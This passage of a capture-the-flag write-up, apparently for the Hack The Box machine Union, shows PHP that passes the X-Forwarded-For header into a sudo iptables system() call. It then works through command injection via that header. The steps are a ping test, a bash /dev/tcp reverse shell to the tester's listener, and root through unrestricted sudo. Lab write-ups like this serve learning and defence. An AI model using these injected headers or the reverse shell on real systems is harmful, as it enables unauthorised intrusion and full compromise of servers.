+  <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Authenticated'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM flag where one = ?"</span><span class="p">;</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">store_result</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Authenticated'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+      <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /firewall.php"</span><span class="p">);</span>
+      <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+...[snip]...
+</code></pre></div></div>
+<p>If the correct flag is submitted, then the <code class="language-plaintext highlighter-rouge">Authenticated</code> value for my session is set to True. That’s why I could access <code class="language-plaintext highlighter-rouge">firewall.php</code> where I couldn’t before.</p>
+<p>Looking at <code class="language-plaintext highlighter-rouge">firewall.php</code>, it’s got the display HTML, as well as the logic to open the firewall:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">require</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Authenticated'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="k">echo</span> <span class="s2">"Access Denied"</span><span class="p">;</span>
+  <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">id=</span><span class="s">"bootstrap-css"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="c">&lt;!------ Include the above in your HEAD tag ----------&gt;</span>
+
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"text-center m-5"</span><span class="nt">&gt;</span>Join the UHC - November Qualifiers<span class="nt">&lt;/h1&gt;</span>
+
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"bg-dark text-center p-5 mt-4"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container p-5"</span><span class="nt">&gt;</span>
+<span class="cp">&lt;?php</span>
+  <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+  <span class="p">};</span>
+  <span class="nb">system</span><span class="p">(</span><span class="s2">"sudo /usr/sbin/iptables -A INPUT -s "</span> <span class="mf">.</span> <span class="nv">$ip</span> <span class="mf">.</span> <span class="s2">" -j ACCEPT"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+              <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"text-white"</span><span class="nt">&gt;</span>Welcome Back!<span class="nt">&lt;/h1&gt;</span>
+              <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"text-white"</span><span class="nt">&gt;</span>Your IP Address has now been granted SSH Access.<span class="nt">&lt;/h3&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/section&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+</code></pre></div></div>
+<h4 id="identify-command-injection">Identify Command Injection</h4>
+<p>This block of code is the insecure part:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+  <span class="p">};</span>
+  <span class="nb">system</span><span class="p">(</span><span class="s2">"sudo /usr/sbin/iptables -A INPUT -s "</span> <span class="mf">.</span> <span class="nv">$ip</span> <span class="mf">.</span> <span class="s2">" -j ACCEPT"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>It’s using <code class="language-plaintext highlighter-rouge">system</code> to call <code class="language-plaintext highlighter-rouge">sudo iptables</code>. While I’m sure the developer thought it was ok because the attacker cannot forge their remote address, what I can control is the <code class="language-plaintext highlighter-rouge">X-FORWARDED-FOR</code> header.</p>
+<h3 id="command-injection">Command Injection</h3>
+<h4 id="poc">POC</h4>
+<p>I’ll send the GET request to <code class="language-plaintext highlighter-rouge">firewall.php</code> over to Burp Repeater to play with it. I’ll add a header:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/firewall.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.128</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.128/challenge.php</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=orpc54gjbbmaih8loabi2ru7bi</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">X-FORWARDED-FOR</span><span class="p">:</span> <span class="s">1.1.1.1; ping -c 1 10.10.14.6;</span>
+</code></pre></div></div>
+<p>With <code class="language-plaintext highlighter-rouge">tcpdump</code> listening, I’ll send the request. I get a ping:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+16:28:32.771157 IP 10.10.11.128 &gt; 10.10.14.6: ICMP echo request, id 1, seq 1, length 64
+16:28:32.771182 IP 10.10.14.6 &gt; 10.10.11.128: ICMP echo reply, id 1, seq 1, length 64
+</span></code></pre></div></div>
+<p>It’s important to have the trailing <code class="language-plaintext highlighter-rouge">;</code> after my command. Otherwise, it makes:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/sbin/iptables <span class="nt">-A</span> INPUT <span class="nt">-s</span> 1.1.1.1<span class="p">;</span> ping <span class="nt">-c</span> 1 10.10.14.6 <span class="nt">-j</span> ACCEPT
+</code></pre></div></div>
+<p>This command will result in an error saying that <code class="language-plaintext highlighter-rouge">ping</code> has no option <code class="language-plaintext highlighter-rouge">-j</code>.</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>It’s possible that special characters will mess things up, but the first I tried was to just drop a Bash reverse shell into the header:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/firewall.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.128</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.128/challenge.php</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=orpc54gjbbmaih8loabi2ru7bi</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">X-FORWARDED-FOR</span><span class="p">:</span> <span class="s">1.1.1.1; bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1";</span>
+</code></pre></div></div>
+<p>On sending (with <code class="language-plaintext highlighter-rouge">nc</code> listening), it worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.128 49486
+bash: cannot set terminal process group (793): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@union:~/html$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell with <code class="language-plaintext highlighter-rouge">script</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@union:~/html$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, file is /dev/null 
+</span><span class="gp">www-data@union:~/html$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@union:~/html$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<p>It was clear in the PHP code that www-data has to be able to run <code class="language-plaintext highlighter-rouge">sudo iptables</code> in order to open ports in the firewall. Running <code class="language-plaintext highlighter-rouge">sudo -l</code> shows this account has much more privilege:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@union:~/html$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for www-data on union:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on union:
+    (ALL : ALL) NOPASSWD: ALL
+</span></code></pre></div></div>
+<p>It can run any command using <code class="language-plaintext highlighter-rouge">sudo</code> without a password. I’ll use this to get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@union:~/html$</span><span class="w"> </span><span class="nb">sudo </span>bash
+<span class="go">root@union:/var/www/html#
+</span></code></pre></div></div>
+<p>And grab the root flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@union:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">92471af0************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/11/22/htb-union.html"></a>
+</article>
